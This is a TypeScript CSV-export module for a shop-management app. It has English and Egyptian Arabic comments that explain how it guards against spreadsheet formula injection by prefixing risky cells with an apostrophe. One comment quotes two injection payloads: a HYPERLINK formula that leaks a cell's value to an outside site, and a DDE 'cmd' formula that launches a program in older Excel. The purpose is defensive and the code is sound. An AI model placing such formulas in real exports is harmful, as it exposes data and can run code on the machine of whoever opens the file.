// CSV rather than a real spreadsheet file, on purpose: Excel opens it,
// Google Sheets opens it, and it needs no library - which matters when
// the whole point is "your data is yours and you can walk away with
// it at any moment".
//
// The BOM at the front is not decoration. Without it Excel on Windows
// reads UTF-8 Arabic as Latin-1 and every name comes out as mojibake,
// which makes an export that technically worked look broken to the
// person it was built to reassure.
const BOM = "﻿";

// ============================================================
// حقن المعادلات — ليه فيه شرطة مايلة قبل بعض الأسماء
// ============================================================
//
// إكسل بيعامل أي خانة بتبدأ بـ`=` أو `+` أو `-` أو `@` على إنها
// **معادلة**، مش نص. يعني صنف اسمه:
//
//     =HYPERLINK("http://site.com?x="&A1,"اضغط هنا")
//
// بيتحوّل لرابط شغّال أول ما صاحب المحل يفتح الملف. والصيغة القديمة
// `=cmd|'/c calc'!A1` بتشغّل برامج في نسخ إكسل القديمة (اللي المحلات
// المصرية شغالة عليها فعلًا).
//
// والاسم ده **مش بييجي مننا** — بييجي من:
//   ١. موظف معاه صلاحية `manage_items` بيسمّي صنف
//   ٢. ملف أسعار مستورد من مورد
//
// يعني اللي بيكتب النص واللي بيفتح الملف مش نفس الشخص. ده بالظبط
// تعريف الثغرة.
//
// الحل المتعارف عليه: شرطة مايلة (') قدام الخانة. إكسل بيشيلها من
// العرض وبيعتبر الباقي نص. جوجل شيتس بيعمل نفس الحاجة.
//
// **ما نمسحش الحرف** — لو صنف اسمه فعلًا "-كوباية" لازم يفضل كده.
const RISKY_START = /^[=+\-@\t\r]/;

function cell(value: unknown): string {
  if (value === null || value === undefined) return "";

  // الأرقام مابتتلمسش: -50 في عمود الرصيد رقم، مش معادلة. لو حوّلناها
  // لنص بشرطة مايلة، إكسل هيقراها نص والجمع هيقع.
  if (typeof value === "number") {
    return Number.isFinite(value) ? String(value) : "";
  }

  let text = String(value);

  if (RISKY_START.test(text)) text = `'${text}`;

  if (/[",\n\r]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }

  return text;
}

export function toCsv(
  headers: string[],
  rows: (unknown[])[]
): string {
  const lines = [headers.map(cell).join(",")];

  for (const row of rows) {
    lines.push(row.map(cell).join(","));
  }

  return BOM + lines.join("\r\n");
}

export function downloadCsv(filename: string, content: string): void {
  const blob = new Blob([content], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);

  const link = document.createElement("a");
  link.href = url;
  link.download = filename;

  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  URL.revokeObjectURL(url);
}

export function dateStamp(): string {
  const now = new Date();

  const y = now.getFullYear();
  const m = String(now.getMonth() + 1).padStart(2, "0");
  const d = String(now.getDate()).padStart(2, "0");

  return `${y}-${m}-${d}`;
}
